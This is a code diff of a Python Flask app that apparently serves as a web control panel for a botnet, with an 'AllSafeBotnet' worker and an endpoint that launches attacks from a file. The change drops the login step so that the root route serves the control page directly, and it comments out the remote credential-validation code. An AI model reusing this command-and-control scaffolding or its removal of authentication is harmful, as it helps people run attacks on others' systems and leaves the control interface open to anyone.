@@ -33,14 +33,8 @@ if the process fails an error message will be returned; if it will succed the am
 If the method is GET, the login form will be shown.
 """
 @app.route("/", methods=['GET', 'POST'])
-def loginPage():
-    if request.method == 'POST':
-        if request.form['access'] == 'remote':
-            return login(request.form['ip'], request.form['u'], request.form['p'])
-        else:
-            return render_template("localcontrolpage.html")
-    else:
-        return show_login_form()
+def showControlPage():
+    return render_template("localcontrolpage.html")
 
 """
 In the controlpage you can submit a new request of two different type: upload or attack.
@@ -59,29 +53,37 @@ def performAttack():
             allsafe = Worker.AllSafeBotnet()
             allsafe.attack('./data/current_attack.txt', override=True)
             return "OK", 200
+
     else:
         return "Forbidden!", 403
 
 
-def show_login_form():
-    # The render template method will render an HTML page using Jinja2 template if any.
-    return render_template("loginpage.html")
+# def show_login_form():
+#     # The render template method will render an HTML page using Jinja2 template if any.
+#     return render_template("loginpage.html")
 
 
-def login(ip, username, password):
-    #It will just valide the username and password and it will return the correct page
-    if (validate(ip, username, password)):
-        return redirect("http://" + ip, code=301)
-    else:
-        return abort(401)
-
-
-def validate(ip, username, password):
-    if (requests.post("http://" +ip + '/test', auth=HTTPBasicAuth(username,password)).status_code == 200):
-        return True
-    else:
-        #even if the requests fails the login phase is aborted
-        return False
+# def login(ip, username, password):
+#     #It will just valide the username and password and it will return the correct page
+#     try:
+#         isvalid = validate(ip, username, password)
+#     except requests.exceptions.RequestException as ReqExc:
+#         # TODO log?
+#         return "Page not found", 404
+#     if (isvalid):
+#         return redirect("http://" + ip, code=301)
+#     else:
+#         return abort(401)
+#
+#
+# def validate(ip, username, password):
+#
+#     response = requests.post("http://" + ip + '/login', auth=HTTPBasicAuth(username, password))
+#     if (response.status_code == 200):
+#         return True
+#     else:
+#         #even if the requests fails the login phase is aborted
+#         return False
 
 
 def prepareConfigFile(where, params):
